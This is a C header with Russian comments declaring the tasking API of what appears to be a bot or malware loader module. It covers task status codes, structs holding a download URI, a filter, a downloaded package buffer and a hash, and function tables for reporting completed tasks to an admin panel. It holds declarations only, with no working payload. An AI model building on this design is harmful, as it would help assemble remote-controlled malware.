#ifndef __MOD_TASKSAPI_H_
#define __MOD_TASKSAPI_H_

#include "../../mod_shared/pack_protect.h"

typedef enum
{
    TS_Obtained = 0,    // Задание получено.
    TS_Completed,       // Удачное выполнение команды.
    TS_Rejected,        // Задание не подходит боту.
    TS_InternalError,   // Внутренняя ошибка.
    TS_InvalidSign,     // Не верная сигнатура.
    TS_HashError,       // Хеш сумма не совпадет.
    TS_DecompressError, // Ошибка при распаковке.
    TS_SaveError,       // Не удалось сохранить на диск.
} task_status_e;


typedef struct _task
{
    struct _task* pNext;    // Указатель на следующее задание.
    uint32_t id;            // Внутренний ID для задания, который должен возвращаться обратно админке с кодом ошибки.
    uint32_t groupId;       // Внутренний ID группы, которой принадлежит данное задание. Должно возвращаться контролеру в отчёте.
    uint8_t status;         // Результат выполнения команды.
    char* uri;              // URI для загрузки файла.
    char* filter;           // Raw-фильтр для задания.
    uint8_t* packBuffer;    // Загруженный пак, который будет сохранён в случае отложенного запуска.
    uint32_t packSize;      // Размер загруженного пака.
    uint8_t sha1Hash[20];   // SHA-160 хеш для различных целей (проверки идентичности бандлов).
} task_t, *ptask_t;

typedef bool_t (*Fntasks_filter_uint32_pair)(char** pItr, char* end, uint32_t realVal1, uint32_t realVal2);
typedef bool_t (*Fntasks_filter_numeric)(char** pItr, char* end, uint64_t realVal);
typedef void (*Fntasks_filter)(ptask_t pTask);


typedef struct _mod_tasks_private
{
    Fntasks_filter_uint32_pair fntasks_filter_uint32_pair;
    Fntasks_filter_numeric fntasks_filter_numeric;
    Fntasks_filter fntasks_filter;

    ptask_t pTaskHead;
    uint8_t* pModBase;

    char biPath[8]; // Bundle's items path
} mod_tasks_private_t, *pmod_tasks_private_t;

// Интерфейсные функции
typedef void (*Fntasks_shutdown_routine)();

/* Добавляет задание в список. */
typedef void (*Fntasks_add_task)(ptask_t pTask);

/* Удаляет задание из списка. */
typedef void (*Fntasks_remove_all)();

/* Возвращает количество выполненных заданий ( > TS_Accepted). */
typedef uint32_t (*Fntasks_get_completed_task_count)();

/* Возвращает следующее по списку задание со статусом TS_Accepted. */
typedef ptask_t (*Fntasks_get_next_obtained)(ptask_t pTask);

/* Заполняет массив элементами <id><status> для заданий со статусом TS_Completed. */
typedef void (*Fntasks_fill_with_completed)(pvoid_t* pVector, uint32_t* pSize);

/** Уничтожает весь список с заданиями. */
typedef ptask_t (*Fntasks_destroy)(ptask_t pTask);

typedef int (*Fntasks_save_bundle_entry)(pbundle_info_entry_t pBundleEntry);

typedef void (*Fntasks_load_bundle_entries)(pbundle_info_entry_t* pBundlesEntries, uint32_t* pCount);

typedef int (*Fntasks_save_bundle_entries)(pbundle_info_entry_t pBundlesItems, uint32_t count);

typedef struct _mod_tasks_block
{
    Fntasks_shutdown_routine fntasks_shutdown_routine;
    Fntasks_add_task fntasks_add_task;
    Fntasks_remove_all fntasks_remove_all;
    Fntasks_get_completed_task_count fntasks_get_completed_task_count;
    Fntasks_get_next_obtained fntasks_get_next_obtained;
    Fntasks_fill_with_completed fntasks_fill_with_completed;
    Fntasks_destroy fntasks_destroy;
    Fntasks_save_bundle_entry fntasks_save_bundle_entry;
    Fntasks_load_bundle_entries fntasks_load_bundle_entries;
    Fntasks_save_bundle_entries fntasks_save_bundle_entries;

    mod_tasks_private_t;
} mod_tasks_block_t, *pmod_tasks_block_t;

#endif // __MOD_TASKSAPI_H_
